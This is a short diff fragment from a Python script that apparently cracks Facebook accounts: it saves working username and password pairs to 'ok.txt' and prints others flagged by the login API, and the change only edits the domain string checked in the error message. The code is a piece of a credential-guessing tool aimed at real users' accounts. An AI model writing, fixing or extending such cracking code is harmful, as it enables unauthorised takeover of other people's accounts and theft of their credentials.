@@ -128,7 +128,7 @@ def moch_yayan():
                  else:
                         with open('ok.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
-             elif 'm.facebook.com' in response.json()['error_msg']:
+             elif 'www.facebook.com' in response.json()['error_msg']:
                    print(f"\r\033[1;93m  * --> {username}|{password}                    ",end="")
                    print()
                    check += 1
